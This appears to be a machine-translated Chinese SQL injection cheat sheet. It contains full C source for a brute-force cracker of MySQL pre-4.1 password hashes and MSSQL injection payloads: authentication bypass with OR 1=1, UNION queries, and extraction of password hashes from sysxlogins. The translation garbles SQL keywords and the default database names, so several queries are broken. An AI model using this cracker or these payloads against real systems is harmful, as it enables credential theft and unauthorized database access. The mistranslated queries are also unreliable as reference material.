密码破解
该隐&亚伯和开膛手约翰都能破解MySQL 3.x-6.x密码。

可以找到用于JTR的Metasploit模块。这里.

MySQL<4.1密码破解器
这个工具是一个用于MySQL哈希密码的高速蛮力密码破解器.它可以破解一个包含任何可打印的ASCII字符的8字符密码，在普通PC上只需几个小时。

 /* This program is public domain. Share and enjoy.
*
* Example:
* $ gcc -O2 -fomit-frame-pointer MySQLfast.c -o MySQLfast
* $ MySQLfast 6294b50f67eda209
* Hash: 6294b50f67eda209
* Trying length 3
* Trying length 4
* Found pass: barf
*
* The MySQL password hash function could be strengthened considerably
* by:
* - making two passes over the password
* - using a bitwise rotate instead of a left shift
* - causing more arithmetic overflows
*/

#include <stdio.h>

typedef unsigned long u32;

/* Allowable characters in password; 33-126 is printable ascii */
#define MIN_CHAR 33
#define MAX_CHAR 126

/* Maximum length of password */
#define MAX_LEN 12

#define MASK 0x7fffffffL

int crack0(int stop, u32 targ1, u32 targ2, int *pass_ary)
{
  int i, c;
  u32 d, e, sum, step, diff, div, xor1, xor2, state1, state2;
  u32 newstate1, newstate2, newstate3;
  u32 state1_ary[MAX_LEN-2], state2_ary[MAX_LEN-2];
  u32 xor_ary[MAX_LEN-3], step_ary[MAX_LEN-3];
  i = -1;
  sum = 7;
  state1_ary[0] = 1345345333L;
  state2_ary[0] = 0x12345671L;

  while (1) {
    while (i < stop) {
      i++;
      pass_ary[i] = MIN_CHAR;
      step_ary[i] = (state1_ary[i] & 0x3f) + sum;
      xor_ary[i] = step_ary[i]*MIN_CHAR + (state1_ary[i] << 8);
      sum += MIN_CHAR;
      state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
      state2_ary[i+1] = state2_ary[i]
        + ((state2_ary[i] << 8) ^ state1_ary[i+1]);
    }

    state1 = state1_ary[i+1];
    state2 = state2_ary[i+1];
    step = (state1 & 0x3f) + sum;
    xor1 = step*MIN_CHAR + (state1 << 8);
    xor2 = (state2 << 8) ^ state1;

    for (c = MIN_CHAR; c <= MAX_CHAR; c++, xor1 += step) {
      newstate2 = state2 + (xor1 ^ xor2);
      newstate1 = state1 ^ xor1;

      newstate3 = (targ2 - newstate2) ^ (newstate2 << 8);
      div = (newstate1 & 0x3f) + sum + c;
      diff = ((newstate3 ^ newstate1) - (newstate1 << 8)) & MASK;
      if (diff % div != 0) continue;
      d = diff / div;
      if (d < MIN_CHAR || d > MAX_CHAR) continue;

      div = (newstate3 & 0x3f) + sum + c + d;
      diff = ((targ1 ^ newstate3) - (newstate3 << 8)) & MASK;
      if (diff % div != 0) continue;
      e = diff / div;
      if (e < MIN_CHAR || e > MAX_CHAR) continue;

      pass_ary[i+1] = c;
      pass_ary[i+2] = d;
      pass_ary[i+3] = e;
      return 1;
    }

    while (i >= 0 && pass_ary[i] >= MAX_CHAR) {
      sum -= MAX_CHAR;
      i--;
    }
    if (i < 0) break;
    pass_ary[i]++;
    xor_ary[i] += step_ary[i];
    sum++;
    state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
    state2_ary[i+1] = state2_ary[i]
      + ((state2_ary[i] << 8) ^ state1_ary[i+1]);
  }

  return 0;
}

void crack(char *hash)
{
  int i, len;
  u32 targ1, targ2, targ3;
  int pass[MAX_LEN];

  if ( sscanf(hash, "%8lx%lx", &targ1, &targ2) != 2 ) {
    printf("Invalid password hash: %s\n", hash);
    return;
  }
  printf("Hash: %08lx%08lx\n", targ1, targ2);
  targ3 = targ2 - targ1;
  targ3 = targ2 - ((targ3 << 8) ^ targ1);
  targ3 = targ2 - ((targ3 << 8) ^ targ1);
  targ3 = targ2 - ((targ3 << 8) ^ targ1);

  for (len = 3; len <= MAX_LEN; len++) {
    printf("Trying length %d\n", len);
    if ( crack0(len-4, targ1, targ3, pass) ) {
      printf("Found pass: ");
      for (i = 0; i < len; i++)
        putchar(pass[i]);
      putchar('\n');
      break;
    }
  }
  if (len > MAX_LEN)
    printf("Pass not found\n");
}

int main(int argc, char *argv[])
{
  int i;
  if (argc <= 1)
    printf("usage: %s hash\n", argv[0]);
  for (i = 1; i < argc; i++)
    crack(argv[i]);
  return 0;
}
				
MSSQL
默认数据库
酒吧	MSSQL 2005不可用
模型	可在所有版本中使用
msdb	可在所有版本中使用
诱饵	可在所有版本中使用
北风	可在所有版本中使用
信息图式	可从MSSQL 2000及更高版本获得
注释剔除查询
以下内容可用于在注入后注释掉查询的其余部分：

/*	C型评论
--	SQL注释
;%00	空字节

例子：
从用户名=‘OR 1=1的用户中选择*--‘和密码=’；
从id=‘UNION选择1、2、3的用户中选择*/*';
测试版本
@版本

例子：
如果MSSQL版本为2008，则为true。
从id=‘1’和@版本比如‘%2008%’；
注：

输出还将包含Windows操作系统的版本。
数据库凭证
数据库.表	大师.系统，大师.系统处理
柱	名字，名字
当前用户	user，system_user，suser_sname()，is_srvrolemenger(‘sysadmin’)
数据库凭证	从master.dbo.sysxlogins中选择用户密码

例子：
返回当前用户：
从master.sysprocess中选择loginameSPID=@@SPID；

检查用户是否是管理员：
选择(当(is_SRVROLEMEMBER(‘sysadmin’)=1)的情况下，“1‘否则’0‘结束)；
数据库名称
数据库表	硕士.系统数据库
列	名字，姓名
当前DB	DB_NAME(I)

例子：
选择DB_NAME(5);
选择名字，姓名从…硕士.系统数据库;
服务器主机名
@ServerName
SERVERPROPERTY()

例子：
选择SERVERPROPERTY(“产品版本”), SERVERPROPERTY(“产品水平”), SERVERPROPERTY(“版”);
注：

SERVERPROPERTY()可从MSSQL 2005及更高版本获得。
